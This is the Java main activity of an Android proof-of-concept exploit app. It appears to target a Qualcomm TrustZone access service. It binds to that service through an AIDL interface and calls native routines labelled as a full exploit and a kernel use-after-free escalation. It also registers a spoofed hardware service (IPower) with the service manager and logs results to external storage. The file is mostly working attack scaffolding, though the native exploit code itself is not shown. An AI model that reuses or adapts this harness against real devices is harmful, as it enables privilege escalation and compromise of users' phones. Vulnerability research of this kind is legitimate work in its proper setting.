package com.example.tzpoc;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop, btnAddOnly, btnStartServer, btnKernelExploit;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;
    private int lastHandle = -1;

    static {
        System.loadLibrary("pocjni");
    }

    public static native int nativeGetHwServicemanagerPid();
    public static native int nativeExploit(String outputPath, String logPath);
    public static native int nativeAddServiceOnly(String serviceName);
    public static native int nativeStartServer(int handle);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound via AIDL");
                updateStatus("Bound - starting exploit");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeFullExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast to IMinkSocketFd");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);
        btnAddOnly = findViewById(R.id.btn_add_only);
        btnStartServer = findViewById(R.id.btn_start_server);
        btnKernelExploit = findViewById(R.id.btn_kernel_exploit);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });

        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });

        btnAddOnly.setOnClickListener(v -> {
            if (lastHandle < 0) {
                String name = "android.hardware.power.IPower";
                int handle = nativeAddServiceOnly(name);
                if (handle >= 0) {
                    lastHandle = handle;
                    appendLog("[+] ADD_SERVICE succeeded! handle=" + handle);
                    Toast.makeText(this, "Service added: handle=" + handle, Toast.LENGTH_SHORT).show();
                } else {
                    appendLog("[-] ADD_SERVICE failed: " + handle);
                    Toast.makeText(this, "ADD_SERVICE failed", Toast.LENGTH_SHORT).show();
                }
            } else {
                appendLog("[*] Service already registered. handle=" + lastHandle);
            }
        });

        btnStartServer.setOnClickListener(v -> {
            if (lastHandle >= 0) {
                int pid = nativeStartServer(lastHandle);
                if (pid >= 0) {
                    appendLog("[+] Server started. PID=" + pid);
                    Toast.makeText(this, "Server PID=" + pid, Toast.LENGTH_SHORT).show();
                } else {
                    appendLog("[-] Server start failed");
                    Toast.makeText(this, "Server start failed", Toast.LENGTH_SHORT).show();
                }
            } else {
                appendLog("[-] Please add a service first");
                Toast.makeText(this, "Add a service first", Toast.LENGTH_SHORT).show();
            }
        });

        btnKernelExploit.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> {
                    appendLog("=== Starting Kernel UAF Exploit ===");
                    String outputPath = getDumpDir() + "/cve_result.txt";
                    String logPath = getDumpDir() + "/binder_traffic.log";
                    int result = nativeExploit(outputPath, logPath);
                    appendLog("[*] Exploit result: " + (result == 1 ? "SUCCESS" : "FAILED"));
                    updateStatus("Exploit " + (result == 1 ? "succeeded" : "failed"));
                    isTesting.set(false);
                    enableButtons(true, false);
                    saveLog();
                });
                testThread.start();
            }
        });

        appendLog("App started.");
        appendLog("Press 'Start Full Exploit' for automatic attack.");
        appendLog("Or use 'Add Service' + 'Start Server' manually.");
        appendLog("New: 'Kernel Exploit' attempts UAF escalation.");
    }

    private void requestPermissions() {
        String[] perms = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
            btnAddOnly.setEnabled(startEnabled);
            btnStartServer.setEnabled(startEnabled);
            btnKernelExploit.setEnabled(startEnabled);
        });
    }

    private void executeFullExploit() {
        appendLog("========================================");
        appendLog("===== Full Exploit Starting =====");

        int pid = nativeGetHwServicemanagerPid();
        appendLog("[*] hwservicemanager PID: " + pid);

        String outputPath = getDumpDir() + "/cve_result.txt";
        String logPath = getDumpDir() + "/binder_traffic.log";
        appendLog("[*] Output: " + outputPath);
        appendLog("[*] Log: " + logPath);

        int result = nativeExploit(outputPath, logPath);
        appendLog("[*] Exploit result: " + (result == 1 ? "SUCCESS" : "FAILED"));

        if (result == 1) {
            appendLog("[+] Check " + outputPath + " for results");
            String content = readFile(outputPath);
            if (content != null) {
                appendLog("[CONTENT]\n" + content);
            }
        }

        appendLog("========================================");
        appendLog("===== Exploit Finished =====");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private String readFile(String path) {
        try {
            java.io.FileInputStream fis = new java.io.FileInputStream(path);
            byte[] buf = new byte[8192];
            int n = fis.read(buf);
            fis.close();
            if (n > 0) return new String(buf, 0, n, StandardCharsets.UTF_8);
        } catch (Exception e) {
            appendLog("Read error: " + e.getMessage());
        }
        return null;
    }

    private String getDumpDir() {
        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir != null && (dir.exists() || dir.mkdirs())) return dir.getAbsolutePath();
        }
        File dir = getFilesDir();
        return dir.getAbsolutePath();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File file = new File(getDumpDir(), "exploit_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(
                    new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Exploit Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("====================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
